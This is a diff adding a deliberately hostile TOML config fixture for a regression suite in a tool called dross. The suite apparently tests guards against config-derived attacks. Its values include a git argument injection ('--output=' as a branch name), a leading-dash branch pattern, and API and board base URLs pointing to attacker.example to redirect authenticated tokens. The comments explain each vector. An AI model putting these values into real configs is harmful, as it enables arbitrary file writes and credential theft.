@@ -1,0 +1,85 @@
+# HOSTILE FIXTURE — inert data for the c-5 regression suite. NOT a live config.
+#
+# This is what a `.dross/project.toml` looks like when the repo you cloned is
+# hostile. Every value below is committed data that dross reads and hands to a
+# subprocess or an authenticated HTTP client. None of it requires the user to
+# type anything: cloning the repo and running a dross command is the whole
+# attack.
+#
+# The suite in internal/cmd/hostile_config_test.go copies this file into a
+# throwaway repo's .dross/ and drives one vector per row of
+# expected-refusals.txt. It is never parsed by dross itself from here.
+#
+# __SENTINEL__ is a placeholder the harness rewrites to a path inside the
+# test's temp dir. If a guard fails open, that path exists afterwards — which
+# is exactly what TestHostileConfigNoPwnSentinel asserts against.
+
+[project]
+  name = "hostile-config-c5"
+  version = "0.0.0.0"
+  description = "Adversarial .dross/project.toml — regression fixture, do not copy into a real repo."
+  created = "2026-08-04"
+
+[stack]
+  languages = ["go"]
+
+[runtime]
+  mode = "native"
+  test_command = "go test ./..."
+
+[repo]
+  layout = "single"
+
+  # VECTOR repair-state / phase-complete / milestone-create / ship-recover.
+  #
+  # git's diff option parser accepts `--output=<file>` on `log`, `show` and
+  # `diff`, and writes the command's output there. A config-derived ref
+  # positional that begins with `-` is therefore not merely "a branch that
+  # doesn't exist" — it is an argument. repair_state.go's
+  # `git log <mainBranch> --reverse --pretty=...` turns this single committed
+  # string into an arbitrary-file write the moment someone runs `dross repair`.
+  #
+  # The `--upload-pack=` shape of the same vector (remote-command execution via
+  # ls-remote/fetch) is carried per-row in expected-refusals.txt rather than
+  # here, because there is only one git_main_branch key to hold a payload.
+  git_main_branch = "--output=__SENTINEL__"
+
+  # VECTOR phase-create. Rendered for every new phase branch, so the
+  # leading dash reaches `git checkout -b <branch>` without any config-derived
+  # ref being involved at all.
+  branch_pattern = "-p/<id>"
+
+  commit_convention = "conventional"
+  squash_merge = true
+
+[remote]
+  # The derivation source for the host allowlist. Left honest on purpose: the
+  # attack is that api_base diverges from it, and a fixture that also poisoned
+  # this key would prove nothing about the derivation.
+  url = "https://github.com/Rivil/dross"
+  provider = "github"
+
+  # VECTOR ship-open. Every authenticated forge request — and the secret named
+  # by auth_env with it — is redirected to a host the repo chose.
+  api_base = "https://attacker.example"
+
+  log_api = true
+  auth_env = "DROSS_FIXTURE_TOKEN"
+
+[board]
+  provider = "github"
+
+  # VECTOR board-client. Same redirect against the board client, where the
+  # secret is a tracker PAT — typically the broadest-scoped token dross holds.
+  base_url = "https://attacker.example"
+
+  auth_env = "DROSS_FIXTURE_TOKEN"
+  project = "Rivil/dross"
+  enabled = true
+
+[paths]
+
+[env]
+
+[goals]
+  core_value = "Reproduce, in one file, every config-derived trust boundary v1.2's config-trust-hardening phase closes."
